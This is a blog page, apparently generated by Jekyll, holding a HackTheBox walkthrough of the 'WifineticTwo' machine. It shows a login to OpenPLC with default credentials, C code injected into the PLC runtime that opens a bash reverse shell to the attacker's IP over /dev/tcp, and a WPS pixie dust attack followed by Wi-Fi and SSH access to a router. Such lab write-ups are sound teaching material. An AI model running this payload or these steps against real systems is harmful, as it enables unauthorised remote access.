@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html class="direction--ltr"lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>WifineticTwo-Linux-Easy | Pwn3d777</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="WifineticTwo-Linux-Easy" />
+<meta name="author" content="GitHub User" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="WifineticTwo" />
+<meta property="og:description" content="WifineticTwo" />
+<link rel="canonical" href="https://your-site-url/writeups/2025/07/10/734f48dc-c3e1-4199-b090-803803bdf8b8-export-fd465bcc-2039-4e91-b2af-966f3199ca08.html" />
+<meta property="og:url" content="https://your-site-url/writeups/2025/07/10/734f48dc-c3e1-4199-b090-803803bdf8b8-export-fd465bcc-2039-4e91-b2af-966f3199ca08.html" />
+<meta property="og:site_name" content="Pwn3d777" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2025-07-10T16:05:57+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="WifineticTwo-Linux-Easy" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"GitHub User"},"dateModified":"2025-07-10T16:05:57+00:00","datePublished":"2025-07-10T16:05:57+00:00","description":"WifineticTwo","headline":"WifineticTwo-Linux-Easy","mainEntityOfPage":{"@type":"WebPage","@id":"https://your-site-url/writeups/2025/07/10/734f48dc-c3e1-4199-b090-803803bdf8b8-export-fd465bcc-2039-4e91-b2af-966f3199ca08.html"},"url":"https://your-site-url/writeups/2025/07/10/734f48dc-c3e1-4199-b090-803803bdf8b8-export-fd465bcc-2039-4e91-b2af-966f3199ca08.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" />
+  <link rel="stylesheet" href="/assets/css/magnific-popup.css"><link type="application/atom+xml" rel="alternate" href="https://your-site-url/feed.xml" title="Pwn3d777" /><script src="https://code.jquery.com/jquery-3.2.0.min.js"></script> 
+  <script src="/assets/js/jquery.magnific-popup.js"></script>
+</head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">Pwn3d777<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        
+        
+        <a class="color-cyan-hover" href="https://twitter.com/bitbrain_"><i class="fab fa-twitter-square"></i></a>
+        
+        
+        
+        <a class="color-red-hover" href="https://bitbrain.itch.io"><i class="fab fa-itch-io"></i></a>
+        
+        
+        
+        <a class="color-purple-hover" href="https://github.com/bitbrain"><i class="fab fa-github-square"></i></a>
+        
+        
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        
+  <div class="author-box">
+
+<div class="description">This is my blog, here you will find more information about me, in addition to my work on HackTheBox and some interesting apps i've developed
+</div>
+
+</div>
+
+
+<div class="post">
+  <h1 class="post-title">WifineticTwo-Linux-Easy</h1>
+  
+  <div class="post-date">
+    Published on 10 Jul 2025
+    
+  </div>
+  
+  <h1 id="wifinetictwo">WifineticTwo</h1>
+
+<h1 id="1-enumeration">1. Enumeration</h1>
+
+<p><img src="/assets/images/734f48dc-c3e1-4199-b090-803803bdf8b8-export-fd465bcc-2039-4e91-b2af-966f3199ca08/734f48dc-c3e1-4199-b090-803803bdf8b8-export-fd465bcc-2039-4e91-b2af-966f3199ca08_Untitled.png" alt="Untitled" /></p>
+
+<p>There is a http service, take a look of the web application</p>
+
+<p><img src="/assets/images/734f48dc-c3e1-4199-b090-803803bdf8b8-export-fd465bcc-2039-4e91-b2af-966f3199ca08/734f48dc-c3e1-4199-b090-803803bdf8b8-export-fd465bcc-2039-4e91-b2af-966f3199ca08_Untitled_1.png" alt="Untitled" /></p>
+
+<p>OpenPLC used openplc as default credentials, we use it and it worked.</p>
+
+<p><img src="/assets/images/734f48dc-c3e1-4199-b090-803803bdf8b8-export-fd465bcc-2039-4e91-b2af-966f3199ca08/734f48dc-c3e1-4199-b090-803803bdf8b8-export-fd465bcc-2039-4e91-b2af-966f3199ca08_Untitled_2.png" alt="Untitled" /></p>
+
+<h1 id="2-user-flag">2. User flag</h1>
+
+<p><img src="/assets/images/734f48dc-c3e1-4199-b090-803803bdf8b8-export-fd465bcc-2039-4e91-b2af-966f3199ca08/734f48dc-c3e1-4199-b090-803803bdf8b8-export-fd465bcc-2039-4e91-b2af-966f3199ca08_Untitled_3.png" alt="Untitled" /></p>
+
+<p>Inside there is a section with C code that it may run on the server so we try to inject a rev shell</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">"ladder.h"</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/wait.h&gt;</span><span class="cp">
+</span>
+<span class="c1">//-----------------------------------------------------------------------------</span>
+<span class="c1">// DISCLAIMER: EDDITING THIS FILE CAN BREAK YOUR OPENPLC RUNTIME! IF YOU DON'T</span>
+<span class="c1">// KNOW WHAT YOU'RE DOING, JUST DON'T DO IT. EDIT AT YOUR OWN RISK.</span>
+<span class="c1">//</span>
+<span class="c1">// PS: You can always restore original functionality if you broke something</span>
+<span class="c1">// in here by clicking on the "Restore Original Code" button above.</span>
+<span class="c1">//-----------------------------------------------------------------------------</span>
+
+<span class="c1">//-----------------------------------------------------------------------------</span>
+<span class="c1">// These are the ignored I/O vectors. If you want to override how OpenPLC</span>
+<span class="c1">// handles a particular input or output, you must put them in the ignored</span>
+<span class="c1">// vectors. For example, if you want to override %IX0.5, %IX0.6 and %IW3</span>
+<span class="c1">// your vectors must be:</span>
+<span class="c1">//     int ignored_bool_inputs[] = {5, 6}; //%IX0.5 and %IX0.6 ignored</span>
+<span class="c1">//     int ignored_int_inputs[] = {3}; //%IW3 ignored</span>
+<span class="c1">//</span>
+<span class="c1">// Every I/O on the ignored vectors will be skipped by OpenPLC hardware layer</span>
+<span class="c1">//-----------------------------------------------------------------------------</span>
+<span class="kt">int</span> <span class="n">ignored_bool_inputs</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="o">-</span><span class="mi">1</span><span class="p">};</span>
+<span class="kt">int</span> <span class="n">ignored_bool_outputs</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="o">-</span><span class="mi">1</span><span class="p">};</span>
+<span class="kt">int</span> <span class="n">ignored_int_inputs</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="o">-</span><span class="mi">1</span><span class="p">};</span>
+<span class="kt">int</span> <span class="n">ignored_int_outputs</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="o">-</span><span class="mi">1</span><span class="p">};</span>
+
+<span class="c1">//-----------------------------------------------------------------------------</span>
+<span class="c1">// This function is called by the main OpenPLC routine when it is initializing.</span>
+<span class="c1">// Hardware initialization procedures for your custom layer should be here.</span>
+<span class="c1">//-----------------------------------------------------------------------------</span>
+<span class="kt">void</span> <span class="nf">initCustomLayer</span><span class="p">()</span>
+<span class="p">{</span>
+<span class="p">}</span>
+
+<span class="c1">//-----------------------------------------------------------------------------</span>
+<span class="c1">// This function is called by OpenPLC in a loop. Here the internal input</span>
+<span class="c1">// buffers must be updated with the values you want. Make sure to use the mutex </span>
+<span class="c1">// bufferLock to protect access to the buffers on a threaded environment.</span>
+<span class="c1">//-----------------------------------------------------------------------------</span>
+<span class="kt">void</span> <span class="nf">updateCustomIn</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="c1">// Example Code - Overwritting %IW3 with a fixed value</span>
+    <span class="c1">// If you want to have %IW3 constantly reading a fixed value (for example, 53)</span>
+    <span class="c1">// you must add %IW3 to the ignored vectors above, and then just insert this </span>
+    <span class="c1">// single line of code in this function:</span>
+    <span class="c1">//     if (int_input[3] != NULL) *int_input[3] = 53;</span>
+<span class="p">}</span>
+
+<span class="cp">#define LHOST "10.10.14.246"
+#define LPORT "1234"
+</span>
+<span class="c1">//-----------------------------------------------------------------------------</span>
+<span class="c1">// This function is called by OpenPLC in a loop. Here the internal output</span>
+<span class="c1">// buffers must be updated with the values you want. Make sure to use the mutex </span>
+<span class="c1">// bufferLock to protect access to the buffers on a threaded environment.</span>
+<span class="c1">//-----------------------------------------------------------------------------</span>
+<span class="kt">void</span> <span class="nf">updateCustomOut</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="kt">int</span> <span class="n">pipefd</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+    <span class="n">pid_t</span> <span class="n">pid</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">pipe</span><span class="p">(</span><span class="n">pipefd</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">pid</span> <span class="o">=</span> <span class="n">fork</span><span class="p">();</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">pid</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">pid</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">close</span><span class="p">(</span><span class="n">pipefd</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+        <span class="n">dup2</span><span class="p">(</span><span class="n">pipefd</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">STDOUT_FILENO</span><span class="p">);</span>
+        <span class="n">execl</span><span class="p">(</span><span class="s">"/bin/bash"</span><span class="p">,</span> <span class="s">"/bin/bash"</span><span class="p">,</span> <span class="s">"-c"</span><span class="p">,</span> <span class="s">"/bin/bash -i &gt;&amp; /dev/tcp/"</span> <span class="n">LHOST</span> <span class="s">"/"</span> <span class="n">LPORT</span> <span class="s">" 0&gt;&amp;1 &amp;"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="n">close</span><span class="p">(</span><span class="n">pipefd</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+        <span class="n">wait</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+
+<p>Save and compile</p>
+
+<p><img src="/assets/images/734f48dc-c3e1-4199-b090-803803bdf8b8-export-fd465bcc-2039-4e91-b2af-966f3199ca08/734f48dc-c3e1-4199-b090-803803bdf8b8-export-fd465bcc-2039-4e91-b2af-966f3199ca08_Untitled_4.png" alt="Untitled" /></p>
+
+<p>It is necessary to run start PLC to execute the reverse shell.</p>
+
+<p><img src="/assets/images/734f48dc-c3e1-4199-b090-803803bdf8b8-export-fd465bcc-2039-4e91-b2af-966f3199ca08/734f48dc-c3e1-4199-b090-803803bdf8b8-export-fd465bcc-2039-4e91-b2af-966f3199ca08_Untitled_5.png" alt="Untitled" /></p>
+
+<h1 id="3priv-esc">3.Priv esc</h1>
+
+<p>To get the root flag on this machine we need to use wlan0 interface to hack a wifi network</p>
+
+<p><img src="/assets/images/734f48dc-c3e1-4199-b090-803803bdf8b8-export-fd465bcc-2039-4e91-b2af-966f3199ca08/734f48dc-c3e1-4199-b090-803803bdf8b8-export-fd465bcc-2039-4e91-b2af-966f3199ca08_Untitled_6.png" alt="Untitled" /></p>
+
+<p>We can enumerate and try to make a pixie dust attack using oneshot, this attack steal a pin on the router which will help later to access to the password saved on the router.</p>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">sudo</span> <span class="nx">airmon</span><span class="o">-</span><span class="nx">ng</span> <span class="nx">check</span> <span class="nx">kill</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/734f48dc-c3e1-4199-b090-803803bdf8b8-export-fd465bcc-2039-4e91-b2af-966f3199ca08/734f48dc-c3e1-4199-b090-803803bdf8b8-export-fd465bcc-2039-4e91-b2af-966f3199ca08_Untitled_7.png" alt="Untitled" /></p>
+
+<p>Once we found the password it’s time to connect to the wifi network</p>
+
+<p>We will need two files and a set of command according with the documentation.</p>
+
+<p><img src="/assets/images/734f48dc-c3e1-4199-b090-803803bdf8b8-export-fd465bcc-2039-4e91-b2af-966f3199ca08/734f48dc-c3e1-4199-b090-803803bdf8b8-export-fd465bcc-2039-4e91-b2af-966f3199ca08_Untitled_8.png" alt="Untitled" /></p>
+
+<p>First path: /etc/wpa_supplicant/wpa_supplicant-wlan0.conf</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ctrl_interface</span><span class="o">=/</span><span class="n">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">wpa_supplicant</span>
+<span class="n">ctrl_interface_group</span><span class="o">=</span><span class="mi">0</span>
+<span class="n">update_config</span><span class="o">=</span><span class="mi">1</span>
+
+<span class="n">network</span><span class="o">=</span><span class="p">{</span>
+  <span class="n">ssid</span><span class="o">=</span><span class="s">"&lt;NETWORK_SSID&gt;"</span>
+  <span class="n">psk</span><span class="o">=</span><span class="s">"&lt;NETWORK_PASSWORD&gt;"</span>
+  <span class="n">key_mgmt</span><span class="o">=</span><span class="n">WPA</span><span class="o">-</span><span class="n">PSK</span>
+  <span class="n">proto</span><span class="o">=</span><span class="n">WPA2</span>
+  <span class="n">pairwise</span><span class="o">=</span><span class="n">CCMP</span> <span class="n">TKIP</span>
+  <span class="n">group</span><span class="o">=</span><span class="n">CCMP</span> <span class="n">TKIP</span>
+  <span class="n">scan_ssid</span><span class="o">=</span><span class="mi">1</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Second path: /etc/systemd/network/25-wlan.network</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="n">Match</span><span class="p">]</span>
+<span class="n">Name</span><span class="o">=</span><span class="n">wlan0</span>
+
+<span class="p">[</span><span class="n">Network</span><span class="p">]</span>
+<span class="n">DHCP</span><span class="o">=</span><span class="n">ipv4</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/734f48dc-c3e1-4199-b090-803803bdf8b8-export-fd465bcc-2039-4e91-b2af-966f3199ca08/734f48dc-c3e1-4199-b090-803803bdf8b8-export-fd465bcc-2039-4e91-b2af-966f3199ca08_Untitled_9.png" alt="Untitled" /></p>
+
+<div class="language-coq highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">#</span><span class="no">Enable</span><span class="w"> </span><span class="no">wpa</span><span class="w"> </span><span class="no">supplicant</span><span class="w"> </span><span class="no">to</span><span class="w"> </span><span class="no">connect</span><span class="w"> </span><span class="no">it</span><span class="w"> </span><span class="no">trought</span><span class="w"> </span><span class="no">it</span><span class="w">
+</span><span class="no">systemctl</span><span class="w"> </span><span class="no">enable</span><span class="w"> </span><span class="no">wpa_supplicant</span><span class="o">@</span><span class="nn">wlan0</span><span class="p">.</span><span class="no">service</span><span class="w">
+</span><span class="o">#</span><span class="no">Restart</span><span class="w"> </span><span class="no">the</span><span class="w"> </span><span class="no">services</span><span class="w"> </span><span class="no">to</span><span class="w"> </span><span class="no">connect</span><span class="w"> </span><span class="no">automatically</span><span class="w">
+</span><span class="no">systemctl</span><span class="w"> </span><span class="no">restart</span><span class="w"> </span><span class="no">systemd</span><span class="o">-</span><span class="nn">networkd</span><span class="p">.</span><span class="no">service</span><span class="w">
+</span><span class="no">systemctl</span><span class="w"> </span><span class="no">restart</span><span class="w"> </span><span class="no">wpa_supplicant</span><span class="o">@</span><span class="nn">wlan0</span><span class="p">.</span><span class="no">service</span><span class="w">
+</span></code></pre></div></div>
+
+<p><img src="/assets/images/734f48dc-c3e1-4199-b090-803803bdf8b8-export-fd465bcc-2039-4e91-b2af-966f3199ca08/734f48dc-c3e1-4199-b090-803803bdf8b8-export-fd465bcc-2039-4e91-b2af-966f3199ca08_Untitled_10.png" alt="Untitled" /></p>
+
+<p>Use ssh to get into the router and machine pwned!!!</p>
+
+<p><img src="/assets/images/734f48dc-c3e1-4199-b090-803803bdf8b8-export-fd465bcc-2039-4e91-b2af-966f3199ca08/734f48dc-c3e1-4199-b090-803803bdf8b8-export-fd465bcc-2039-4e91-b2af-966f3199ca08_Untitled_11.png" alt="Untitled" />
+<script src="/assets/js/matrix-overlay.js"></script></p>
+
+</div>
+
+
+<div class="comments">
+<div id="disqus_thread"></div>
+<script>
+ var disqus_config = function () {
+     this.page.url = 'https://your-site-url/writeups/2025/07/10/734f48dc-c3e1-4199-b090-803803bdf8b8-export-fd465bcc-2039-4e91-b2af-966f3199ca08.html';
+     this.page.identifier = '/writeups/2025/07/10/734f48dc-c3e1-4199-b090-803803bdf8b8-export-fd465bcc-2039-4e91-b2af-966f3199ca08';
+     this.page.title = 'WifineticTwo-Linux-Easy';
+ };
+
+ (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
+     var d = document, s = d.createElement('script');
+
+     s.src = '//<your-disqus-shortname>.disqus.com/embed.js';
+
+     s.setAttribute('data-timestamp', +new Date());
+     (d.head || d.body).appendChild(s);
+ })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+</div>
+
+
+
+
+<div class="related">
+  <h2>related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/writeups/2025/07/17/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e.html">
+            Dog-Linux-Easy
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/writeups/2025/07/17/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9.html">
+            Titanic-Linux-Easy
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/writeups/2025/07/17/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb.html">
+            Cat-Linux-Medium
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+
+
+<script>
+  let i = 0;
+  const text = '';
+  const speed = parseInt('50');
+  
+  function typeWriter() {
+    if (i < text.length) {
+      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
+      i++;
+      setTimeout(typeWriter, speed);
+    }
+  }
+
+  document.getElementById('animated-post-description').style.display = 'initial';
+  typeWriter();
+
+  // Image modal
+  var $imgs = [];
+  $('img').each(function(idx) {
+    var obj = {
+      src: $(this).attr('src')
+    }
+    $imgs.push(obj);
+    var elem = $(this);
+    $(this).click(function() {
+      $('.modal').magnificPopup('open', idx);
+    });
+  });
+
+  $('.modal').magnificPopup({
+    items: $imgs,
+    type: 'image',
+    closeOnContentClick: true,
+    mainClass: 'mfp-img-mobile',
+    image: {
+      verticalFit: true
+    }
+    
+  });
+</script>
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+
+if (theme === "light") {
+    document.documentElement.setAttribute('data-theme', 'light');
+} else {
+    document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
